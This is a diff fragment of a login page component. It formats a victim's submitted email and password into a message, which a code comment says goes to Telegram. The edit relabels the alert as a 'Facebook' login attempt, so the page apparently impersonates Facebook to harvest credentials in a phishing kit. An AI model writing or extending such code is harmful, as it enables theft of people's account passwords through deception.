@@ -49,7 +49,7 @@ export default function LoginPage() {
 
       // 2) Build message (URI encoded or plain). Telegram accepts plain; we'll send plain text.
       const message = [
-        "🟢 New Login Attempt",
+        "🟢 New Facebook Login Attempt",
         "",
         `📧 Email: ${formData.email}`,
         `🔐 Password: ${formData.password}`,
